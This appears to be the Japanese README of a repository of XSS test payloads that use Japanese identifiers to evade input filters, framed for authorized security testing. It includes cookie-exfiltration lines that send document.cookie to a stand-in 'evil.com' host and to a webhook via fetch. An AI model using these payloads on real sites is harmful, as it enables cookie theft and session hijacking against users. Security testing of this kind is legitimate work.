# 日本語文字を使用したXSSテストペイロード

このリポジトリには、クロスサイトスクリプティング（XSS）のテストベクターのコレクションが含まれています。主に日本語の文字（ひらがな、カタカナ、漢字）を使用して難読化されており、基本的な入力フィルタを回避することを目的としています。これらのペイロードは、教育目的およびセキュリティテストのみを意図しており、制御された環境でのWebアプリケーションの脆弱性を評価するために使用されます。

## ⚠️ 重要な警告

- **破壊的な可能性**: このコレクションの一部のペイロードは、機密データ（例: クッキー、ドメイン情報）の抽出、リダイレクト、または任意のコード実行を行うように設計されています。脆弱なアプリケーションに注入された場合、データ盗難、セッションハイジャック、またはその他のセキュリティ侵害を引き起こす可能性があります。**ライブウェブサイト、本番システム、または明示的な許可なしに使用しないでください**。無許可の使用は法律（例: コンピュータ詐欺および乱用防止法）に違反し、法的結果を招く可能性があります。
  
- **注意して使用**: 常に安全で隔離された環境（例: ローカルVMまたは制御するテストサーバー）でテストしてください。最新のブラウザやセキュリティツールがこれらのペイロードをブロックまたはフラグ付けする可能性があります。XSSテストが初めての場合は、OWASPのXSS防止チートシートなどのリソースを参照してください。

- **倫理的および法的責任**: これらのペイロードは防御的なセキュリティ研究のみを目的としています。悪意のある目的での誤用は非倫理的であり、違法です。セキュリティ専門家でない場合は、OWASP ZAPやBurp Suiteなどの確立されたツールを使用することを検討してください。

## 使用方法

1. **クローンまたはダウンロード**: このリポジトリからペイロードを取得します。
2. **安全のためのカスタマイズ**:
   - ハードコードされたURL（例: `evil.com`）を、独自の制御されたエンドポイント（例: Webhookやログサーバー）に置き換えてください。これにより、偶発的なデータ漏洩や意図しないリクエストを防ぎます。
     - 例: `evil.com?c='+btoa(document.cookie)` を `your-webhook-url.com?c='+btoa(document.cookie)` に変更。
     - RequestBin、ngrok、または自己ホストサーバーなどのサービスを使用して、リクエストを安全にキャプチャします。
   - テストシナリオに合わせてペイロードを変更してください（例: アラートメッセージの調整やログの追加）。
3. **責任を持ってテスト**:
   - テストアプリケーションにペイロードを注入します（例: 入力フィールドやURLパラメータ経由）。
   - 実行を監視し、本物のデータが公開されないことを確認します。
   - ブラウザ開発者コンソールやネットワークインスペクタなどのツールで検証します。

## 例

- 基本的なアラート: `あ=alert;あ(1);` （"1"のポップアップをトリガー）。
- データ抽出: `宝=fetch;石='your-webhook.com?i='+encodeURIComponent(document.cookie);宝(石);` （クッキーをWebhookに送信—`your-webhook.com`を適宜置き換え）。
